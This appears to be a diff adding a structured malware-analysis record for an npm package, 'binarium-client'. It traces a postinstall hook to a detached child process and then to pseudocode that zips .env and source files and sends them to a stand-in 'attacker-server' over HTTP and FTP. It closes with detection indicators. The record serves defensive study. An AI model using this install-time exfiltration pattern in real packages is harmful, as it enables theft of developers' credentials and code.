@@ -1,0 +1,130 @@
+{
+  "package_info": {
+    "package_name": "binarium-client",
+    "package_manager": "npm",
+    "package_versions": "4.0.0 (and others in the campaign, see package list)",
+    "why_malicious": "The package executes code during installation that exfiltrates sensitive data—including source code, configuration files, and user information—from the victim's machine to attacker-controlled infrastructure. This behavior constitutes a severe breach of user trust and directly violates npm security policies by enabling unauthorized data theft and remote access."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "postinstall (during npm install)",
+        "file_location": "package.json",
+        "required_permissions": [
+          "filesystem",
+          "process"
+        ]
+      },
+      "code_snippet": "\"scripts\": { \"postinstall\": \"node preinstall.js\" }",
+      "code_language": "json",
+      "code_behavior": "During installation, the postinstall script in package.json executes preinstall.js using Node.js, initiating the malicious payload and enabling further code execution.",
+      "malice_analysis": {
+        "why_suspicious": "The use of a postinstall script to execute a local JavaScript file is a common initial access technique for npm malware, as it allows arbitrary code execution on the victim's machine immediately upon installation.",
+        "violated_expectations": "Legitimate npm packages rarely require postinstall scripts except for essential build or setup tasks; using it to launch additional scripts without user awareness is highly atypical and dangerous.",
+        "similar_legitimate_use": "Some legitimate packages use postinstall for setup or downloading binaries, but these are usually well-documented and do not execute hidden or obfuscated scripts.",
+        "key_indicators": [
+          "Presence of postinstall script in package.json",
+          "postinstall executes a local JavaScript file (preinstall.js)",
+          "No legitimate build or setup rationale for postinstall"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "postinstall (invoked by postinstall script)",
+        "file_location": "preinstall.js",
+        "required_permissions": [
+          "filesystem",
+          "process"
+        ]
+      },
+      "code_snippet": "const { spawn } = require('child_process');\nconst child = spawn('node', ['index.js'], { detached: true, stdio: 'ignore' });\nchild.unref();",
+      "code_language": "javascript",
+      "code_behavior": "Immediately after installation, preinstall.js spawns index.js as a detached child process using Node.js, allowing the malicious payload to persist and run independently of the parent process.",
+      "malice_analysis": {
+        "why_suspicious": "Spawning a detached and unreferenced child process is a known evasion technique, enabling malware to continue running after the main installation process exits and making detection and cleanup more difficult.",
+        "violated_expectations": "Normal setup scripts do not spawn persistent, hidden child processes, especially not in a detached state with stdio ignored.",
+        "similar_legitimate_use": "Rarely, legitimate daemons or background services may use detached processes, but this is uncommon in npm install scripts and should be well-documented.",
+        "key_indicators": [
+          "child_process.spawn with { detached: true, stdio: 'ignore' }",
+          "child.unref() to allow process to run after parent exits",
+          "Execution of index.js as a background process"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (after install, via index.js execution)",
+        "file_location": "index.js",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "// Pseudocode based on report\niosUser = getCurrentUsername();\nworkingDir = getCurrentWorkingDirectory();\nhttp.get('http://attacker-server', { user: iosUser, dir: workingDir });\nfiles = searchDirs(['.env', '.gitlab', '.github'], ['.asp', '.js', '.php']);\nzipFiles(files);\nuploadToFTP('ftp://attacker-server', zippedArchive);",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, index.js collects the current OS username and working directory, sends this information via HTTP GET to a hardcoded remote server, recursively searches for sensitive files and directories (such as .env, .gitlab, .github, and files with .asp, .js, .php extensions), compresses the results into a zip archive, and uploads the archive to a predefined attacker-controlled FTP server.",
+      "malice_analysis": {
+        "why_suspicious": "Automated collection and exfiltration of user credentials, environment details, and source code is a hallmark of infostealer malware, especially when performed without user consent and sent to hardcoded attacker infrastructure.",
+        "violated_expectations": "Legitimate packages do not search for, compress, or exfiltrate user data or source code to unknown remote servers, particularly without explicit user permission.",
+        "similar_legitimate_use": "Backup or deployment tools may zip and upload files, but only to user-configured, trusted endpoints and never to hardcoded, undocumented servers.",
+        "key_indicators": [
+          "HTTP GET requests containing user and directory info to external server",
+          "Recursive search for sensitive files and directories",
+          "Zipping of collected files",
+          "FTP upload to hardcoded remote server"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Malicious package is installed, triggering the postinstall script defined in package.json.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Execution of preinstall.js"
+    },
+    {
+      "step": 2,
+      "action": "preinstall.js spawns index.js as a detached, unreferenced child process, allowing it to run independently.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "index.js runs in the background, persisting after installation"
+    },
+    {
+      "step": 3,
+      "action": "index.js collects user and environment information, recursively searches for sensitive files, compresses them, and exfiltrates the data to attacker-controlled HTTP and FTP servers.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Attacker receives exfiltrated credentials, source code, and configuration files"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Presence of postinstall script in package.json that executes a local JavaScript file",
+      "Execution of preinstall.js which spawns a detached child process (index.js) using child_process.spawn with detached: true and stdio: 'ignore'",
+      "index.js or similar script performing recursive file and directory search, zipping results, and uploading to external servers",
+      "Outbound HTTP GET requests containing user and directory information to hardcoded domains",
+      "FTP uploads of zipped archives to attacker-controlled endpoints"
+    ],
+    "file_indicators": [
+      "package.json with postinstall script referencing preinstall.js",
+      "preinstall.js containing child_process.spawn with detached: true and unref()",
+      "index.js containing logic for file enumeration, zipping, and network exfiltration"
+    ],
+    "network_indicators": [
+      "HTTP GET requests to attacker-controlled IPs or domains (see IOC list in report)",
+      "FTP uploads to hardcoded attacker servers",
+      "Connections to domains such as oastify.com, requestbin.net, canarytokens.com, and any IPs or URLs listed in the report's IOC section"
+    ],
+    "how_to_detect": "Monitor npm package installations for postinstall scripts that execute local JavaScript files. Flag packages where preinstall.js spawns index.js as a detached process using child_process.spawn with detached: true and unref(). Detect index.js scripts that recursively enumerate user directories, compress files, and upload data to external HTTP or FTP endpoints. Correlate these behaviors with known IOCs and apply YARA rules matching child_process spawn patterns and suspicious network activity to attacker infrastructure."
+  }
+}
